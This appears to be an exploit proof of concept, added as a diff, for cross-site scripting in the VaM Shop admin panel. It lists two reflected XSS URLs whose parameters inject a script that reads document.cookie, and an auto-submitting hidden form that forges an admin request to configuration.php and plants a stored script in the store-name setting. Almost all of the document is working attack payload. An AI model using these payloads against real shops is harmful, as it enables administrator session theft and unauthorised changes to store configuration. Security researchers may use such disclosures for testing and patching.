@@ -1,0 +1,23 @@
+URIs:
+
+http://www.example.com/admin/orders.php?selected_box=customers&status=2"><script>alert(document.cookie)</script>
+http://www.example.com/admin/customers.php?search=1"><script>alert(document.cookie)</script>
+
+Input:
+
+<form action="http://www.example.com/admin/configuration.php?gID=1&action=save" method="post" name="main">
+<input type="hidden" name="STORE_NAME" value='My Shop"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="STORE_OWNER" value="VaM Shop">
+<input type="hidden" name="STORE_OWNER_EMAIL_ADDRESS" value="email@example.com">
+<input type="hidden" name="EXPECTED_PRODUCTS_SORT" value="desc">
+<input type="hidden" name="EXPECTED_PRODUCTS_FIELD" value="date_expected">
+<input type="hidden" name="USE_DEFAULT_LANGUAGE_CURRENCY" value="false">
+<input type="hidden" name="DISPLAY_CART" value="true">
+<input type="hidden" name="ADVANCED_SEARCH_DEFAULT_OPERATOR" value="and">
+<input type="hidden" name="STORE_NAME_ADDRESS" value="Address, Country">
+<input type="hidden" name="SHOW_COUNTS" value="true">
+<input type="hidden" name="CURRENT_TEMPLATE" value="vamshop">
+</form>
+<script>
+document.main.submit();
+</script>
